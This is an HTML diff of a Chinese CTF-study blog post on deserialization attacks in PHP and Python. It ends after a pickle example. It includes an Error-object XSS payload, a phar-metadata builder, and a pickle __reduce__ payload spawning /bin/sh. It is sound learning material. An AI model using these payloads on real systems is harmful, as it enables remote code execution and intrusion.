@@ -1,0 +1,1343 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 \u200b 很早就在学的反序列化，后来写题的时候经常遇到各种各样的反序列化，但是因为有没有好好记录，导致每次都需要去找博客来看，现在开始系统的写一">
+<title>反序列化</title>
+
+<link rel='canonical' href='http://localhost:1313/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="反序列化">
+<meta property='og:description' content="前言 \u200b 很早就在学的反序列化，后来写题的时候经常遇到各种各样的反序列化，但是因为有没有好好记录，导致每次都需要去找博客来看，现在开始系统的写一">
+<meta property='og:url' content='http://localhost:1313/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-07-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-07-02T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="反序列化">
+<meta name="twitter:description" content="前言 \u200b 很早就在学的反序列化，后来写题的时候经常遇到各种各样的反序列化，但是因为有没有好好记录，导致每次都需要去找博客来看，现在开始系统的写一">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/en/" >English</option>
+                                
+                                    <option value="http://localhost:1313/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#一什么是反序列化">一、什么是反序列化</a></li>
+    <li><a href="#二反序列化的分类">二、反序列化的分类</a>
+      <ol>
+        <li><a href="#php反序列化">php反序列化</a>
+          <ol>
+            <li><a href="#php常用魔术方法">php常用魔术方法</a></li>
+            <li><a href="#php字符串逃逸">php字符串逃逸</a></li>
+            <li><a href="#php原生类利用">php原生类利用</a></li>
+            <li><a href="#phar反序列化">phar反序列化</a></li>
+          </ol>
+        </li>
+        <li><a href="#python反序列化">python反序列化</a>
+          <ol>
+            <li><a href="#漏洞成因与利用">漏洞成因与利用</a></li>
+            <li><a href="#深层pickle解析">深层pickle解析</a></li>
+            <li><a href="#绕过">绕过</a></li>
+          </ol>
+        </li>
+        <li><a href="#java反序列化">java反序列化</a></li>
+      </ol>
+    </li>
+    <li><a href="#小结">小结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-07-02</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 11 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>​	很早就在学的反序列化，后来写题的时候经常遇到各种各样的反序列化，但是因为有没有好好记录，导致每次都需要去找博客来看，现在开始系统的写一篇博客来解决这个问题</p>
+<h2 id="一什么是反序列化">一、什么是反序列化
+</h2><p>​	按照我的理解，序列化就是将一个对象（类的对象）转化成字符串或者数据流的一种操作，这样方便运输数据之类的。</p>
+<p>​	那么反序列化就是将序列化后的数据再转化回对象。但是，如果我们精心构造序列化后的数据，那么在反序列化的过程中就可以进行漏洞利用</p>
+<h2 id="二反序列化的分类">二、反序列化的分类
+</h2><p>​	常见的是php、python、java的反序列化，我这个阶段遇到最多的还是php的反序列化。就详细写写php的</p>
+<h3 id="php反序列化">php反序列化
+</h3><p>​	主要就是构造链子、绕过、利用漏洞三个方面。</p>
+<h4 id="php常用魔术方法">php常用魔术方法
+</h4><p>​	首先是了解一些php常用的魔术方法，这些方法是在一些特殊情况下会自动调用的，那么就可能发生A类的a方法调用了B类的b方法，B类的b方法又调用了C类的c方法这样的情况，这就是pop链</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th><code>__construct()</code></th>
+<th style="text-align:center">具有构造函数的类会在每次创建新对象时先调用此方法。</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__destruct()</code></td>
+<td style="text-align:center">析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td style="text-align:center">unserialize( )会检查是否存在一个__wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td style="text-align:center">方法用于一个类被当成字符串时应怎样回应。例如echo$obj;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条<code>E_RECOVERABLE_ERROR</code>级别的致命错误。(例如使用echo 或 print 或 die )	<code>preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name) ,给name实例化一个对象，也可以调用到__toString()</code></td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td style="text-align:center">当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。</td>
+</tr>
+<tr>
+<td><code>__set()</code></td>
+<td style="text-align:center">是为私有成员属性设置值，它含有两个参数，第一个参数是要赋值的属性名，第二个参数是要給属性赋的值，没有返回值在给不可访问（protected 或 private）或不存在的属性赋值时，__ set() 会被自动调用。</td>
+</tr>
+<tr>
+<td><code>__get()</code></td>
+<td style="text-align:center">是获取私有成员的属性值，它含有一个参数，即要获取的成员属性的名称，调用时返回获取的属性值<br/>读取不可访问（protected 或 private）或不存在的属性的值时，__ get() 会被自动调用。</td>
+</tr>
+<tr>
+<td><code>__isset()</code></td>
+<td style="text-align:center">当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__ isset() 会被调用。</td>
+</tr>
+<tr>
+<td><code>__unset()</code></td>
+<td style="text-align:center">当对不可访问（protected 或 private）或不存在的属性调用 unset() 时，__unset() 会被调用。</td>
+</tr>
+</tbody>
+</table></div>
+<p>构造链子是比较简单的，这里直接跳了</p>
+<h4 id="php字符串逃逸">php字符串逃逸
+</h4><p>​	偷个懒，用一下以前写的，这个考点也不太常见，主要是存在替换字符串的话可能会有</p>
+<pre><code>我们将对象序列化之后，会得到类似以下字符串
+
+O:11:&quot;ctfShowUser&quot;:3:{s:8:&quot;username&quot;;s:6:&quot;lierni&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;}
+
+我们来看这一段   s:8:&quot;username&quot;;   意思是长度为8的字符串，内容为&quot;username&quot;。
+
+当存在某些函数将反序列化的字符串替换时，比如将username改为usernames，多加了一个字符，但是s的长度为8，这是对象在序列化的时候固定的，所以最后一个字母“s”就不会被读取，实现了逃逸。
+
+那么当我们传入的username足够多，就有足够多可操作的字符可以构造我们想要的对象成员。
+
+举个例子，还是上面的代码  s:8:&quot;username&quot;; 
+
+我们传入25个username加上&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;}(这些共计25个字符)然后username全被替换成usernames
+
+s:214:&quot;usernameusername.........uesrname&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;将会被替换成
+
+s:214:&quot;usernamesusernames.......usernames&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;
+
+因为字符会被&quot;给制止，所以这里我们通过字符串逃逸，将一个成员变成了三个成员。
+</code></pre>
+<p>减少的看这里</p>
+<p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702161836897.png"
+	width="1199"
+	height="809"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702161836897_hu16923277116591225038.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702161836897_hu10487211713944633440.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250702161836897"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<h4 id="php原生类利用">php原生类利用
+</h4><p>​	接下来是比较重要的点。参考文章<a class="link" href="https://xz.aliyun.com/news/8792"  target="_blank" rel="noopener"
+    >PHP 原生类的利用小结-先知社区</a></p>
+<p>常用的php原生类有以下几种：</p>
+<h5 id="errorexceptionxss绕过hash比较"><code>Error</code>/<code>Exception</code>：XSS/绕过hash比较
+</h5><p><code>Error</code>和<code>Exception</code>内置类是专门用于处理报错的类存在<code>__tostring()</code>方法，可以用这个方法做xss出来。具体poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a = new Error(&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;);
+</span></span><span class="line"><span class="cl">$b = serialize($a);
+</span></span><span class="line"><span class="cl">echo urlencode($b);  
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	同时也可以用来绕过哈希比较，因为只要在同一行定义对象，那么__tostring()返回的东西就可以相同，所以能用来绕过哈希比较，具体看下图</p>
+<p>​	<img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702163224613.png"
+	width="1124"
+	height="811"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702163224613_hu14093069259146849902.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702163224613_hu10039425221326412498.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250702163224613"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="332px"
+	
+></p>
+<h5 id="soapclientssrf"><code>SoapClient</code>：SSRF
+</h5><p>​	<code>SoapClient</code>是一个专门用来访问web服务的类，内置__call()方法，它可以发送 HTTP 和 HTTPS 请求。所以 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>​	具体细节：</p>
+<p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702202520484.png"
+	width="1149"
+	height="831"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702202520484_hu17787412723852408263.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250702202520484_hu4513807677894826009.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250702202520484"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="331px"
+	
+></p>
+<p>如果存在CRLF漏洞，可以SSRF+CRLF，插入任意http头，这里就略过，可以去看参考文章</p>
+<h5 id="simplexmlelementxxe"><code>SimpleXMLElement</code>：XXE
+</h5><p>这个类的构造函数有五个参数：</p>
+<p><code>data</code>：格式正确的字符串，或者是在<code>data_is_url</code>参数为<code>true</code>时，可以是xml文档的路径或url。</p>
+<p><code>options</code>：（可选）用于指定其他Libxml参数，会影响xml文档的读取。</p>
+<p><code>data_is_url</code>:默认为false，为true时见上文。</p>
+<p><code>ns</code>：命名空间前缀或url</p>
+<p><code>is_prefix</code>:true如果ns时前缀，false则为url，默认false</p>
+<p>所以我们设置第三个参数data_is_url为ture，options为2，第一个参数就是url地址。这样就可以进行xxe了</p>
+<p>具体用法涉及无回显xxe，这里还是不多赘述</p>
+<p><code>DirectoryIterator</code>&amp;<code>SplFileObject</code>：读取目录/读取文件</p>
+<p>​	详情可以看ghctf复现的popppp题目</p>
+<h4 id="phar反序列化">phar反序列化
+</h4><p>​	phar是php里类似JAR的一种打包文件，我们在反序列化之后可以将反序列化后的数据打包成phar文件。</p>
+<p>​	然后phar文件中meta-data是以序列化的形式存贮的，在用phar伪协议读取解析phar文件时，会自动反序列化。</p>
+<p>​	如果要进行打包成phar文件，可以用以下方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a = new yesterday();
+</span></span><span class="line"><span class="cl">$a -&gt; study = new today();
+</span></span><span class="line"><span class="cl">$a -&gt; study -&gt; doing = new future();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$phartest=new phar(&#39;test.phar&#39;,0);//后缀名必须为phar，生成后可以随意修改
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$phartest-&gt;startBuffering();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$phartest-&gt;setMetadata($a);//将自定义的meta-data存入manifest中
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$phartest-&gt;setStub(&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;);//设置stub，防止phar文件被直接执行
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$phartest-&gt;addFromString(&#34;test.txt&#34;,&#39;test&#39;); //添加要压缩的文件
+</span></span><span class="line"><span class="cl">//签名自动计算
+</span></span><span class="line"><span class="cl">$phartest-&gt;stopBuffering();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通常是文件上传和文件读取一起考</p>
+<h3 id="python反序列化">python反序列化
+</h3><p>​	python的反序列化有JSON、Pickle之分。Pickle是python独有的，json是通用的。而python的反序列化主要是与pickle有关。</p>
+<p>pickle主要有以下几种操作方法</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:center">dump</th>
+<th style="text-align:center">对象反序列化到文件对象并存入文件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">dumps</td>
+<td style="text-align:center">对象反序列化为 bytes 对象</td>
+</tr>
+<tr>
+<td style="text-align:center">load</td>
+<td style="text-align:center">对象反序列化并从文件中读取数据</td>
+</tr>
+<tr>
+<td style="text-align:center">loads</td>
+<td style="text-align:center">从 bytes 对象反序列化</td>
+</tr>
+</tbody>
+</table></div>
+<p>反序列化后，生成的是pvm，详细信息参考<a class="link" href="https://xz.aliyun.com/news/10530"  target="_blank" rel="noopener"
+    >Python反序列化漏洞分析-先知社区</a></p>
+<p>​	需要注意的是<code>文件对象</code>和<code>网络套接字对象</code>以及<code>代码对象</code>不可以都能使用<code>pickle</code>进行序列化和反序列化</p>
+<p>​	另外如果是自己定义class的话，初值要写进__ init __，如下图。详情参考<a class="link" href="https://zhuanlan.zhihu.com/p/89132768"  target="_blank" rel="noopener"
+    >从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎</a></p>
+<p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703101053971.png"
+	width="1058"
+	height="742"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703101053971_hu10336392649386450964.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703101053971_hu5542665682153909389.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250703101053971"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="342px"
+	
+></p>
+<h4 id="漏洞成因与利用">漏洞成因与利用
+</h4><p>​	漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。简单来说就是python版的<code>__wakeup()</code></p>
+<p><code>__reduce__()</code>有两个参数，第一个是函数名，第二个是该函数名的参数，我们可以通过这个来进行rce</p>
+<p>​	简单的利用payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Demo</span><span class="p">(</span><span class="n">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shell</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="n">shell</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">demo</span> <span class="o">=</span> <span class="n">Demo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
